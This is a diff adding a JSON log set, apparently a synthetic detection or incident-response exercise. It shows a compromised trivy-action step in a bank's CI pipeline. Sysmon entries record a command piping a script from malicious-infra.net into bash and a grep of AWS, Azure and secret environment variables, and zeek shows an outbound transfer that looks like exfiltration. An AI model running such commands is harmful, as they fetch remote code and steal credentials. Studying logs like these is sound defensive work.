@@ -1,0 +1,96 @@
+{
+  "log_id": "LOG001",
+  "timestamp": "2026-03-27T08:12:00Z",
+  "source": "GitHub_Actions_Runner",
+  "repository": "bank-internal/payment-gateway",
+  "action_run": "actions/checkout@v3",
+  "status": "completed",
+  "runner_host": "build-worker-04"
+},
+
+{
+  "log_id": "LOG002",
+  "timestamp": "2026-03-27T08:15:02Z",
+  "source": "GitHub_Actions_Runner",
+  "repository": "bank-internal/payment-gateway",
+  "action_run": "aquasecurity/trivy-action@master",
+  "status": "Starting pre-execution hooks",
+  "runner_host": "build-worker-04"
+},
+
+{
+  "log_id": "LOG003",
+  "timestamp": "2026-03-27T08:15:05Z",
+  "source": "sysmon",
+  "EventID": 1,
+  "Image": "/usr/bin/bash",
+  "CommandLine": "bash -c 'curl -sL <https://malicious-infra.net/payload.sh> | bash'",
+  "ParentImage": "/opt/actions-runner/Runner.Worker",
+  "User": "svc_cicd_runner"
+},
+
+{
+  "log_id": "LOG004",
+  "timestamp": "2026-03-27T08:15:06Z",
+  "source": "sysmon",
+  "EventID": 1,
+  "Image": "/usr/bin/bash",
+  "CommandLine": "bash -c 'echo Running scan setup'",
+  "User": "svc_cicd_runner"
+},
+
+{
+  "log_id": "LOG005",
+  "timestamp": "2026-03-27T08:15:08Z",
+  "source": "sysmon",
+  "EventID": 1,
+  "Image": "/usr/bin/env",
+  "CommandLine": "env | grep -i 'AWS_|AZURE_|SECRET_'",
+  "ParentImage": "/usr/bin/bash",
+  "User": "svc_cicd_runner"
+},
+
+{
+  "log_id": "LOG006",
+  "timestamp": "2026-03-27T08:15:10Z",
+  "source": "zeek",
+  "src_ip": "10.0.40.100",
+  "dest_ip": "198.51.100.99",
+  "dest_port": 443,
+  "service": "ssl",
+  "orig_bytes": 4500,
+  "resp_bytes": 120
+},
+
+{
+  "log_id": "LOG007",
+  "timestamp": "2026-03-27T08:15:12Z",
+  "source": "zeek",
+  "src_ip": "10.0.40.100",
+  "dest_ip": "52.95.110.1",
+  "dest_port": 443,
+  "service": "ssl",
+  "orig_bytes": 8000,
+  "resp_bytes": 7800
+},
+
+{
+  "log_id": "LOG008",
+  "timestamp": "2026-03-27T08:15:15Z",
+  "source": "sysmon",
+  "EventID": 1,
+  "Image": "/usr/local/bin/trivy",
+  "CommandLine": "trivy fs --security-checks config,vuln",
+  "ParentImage": "/usr/bin/bash",
+  "User": "svc_cicd_runner"
+},
+
+{
+  "log_id": "LOG009",
+  "timestamp": "2026-03-27T08:16:00Z",
+  "source": "GitHub_Actions_Runner",
+  "repository": "bank-internal/payment-gateway",
+  "action_run": "aquasecurity/trivy-action@master",
+  "status": "completed successfully",
+  "runner_host": "build-worker-04"
+}
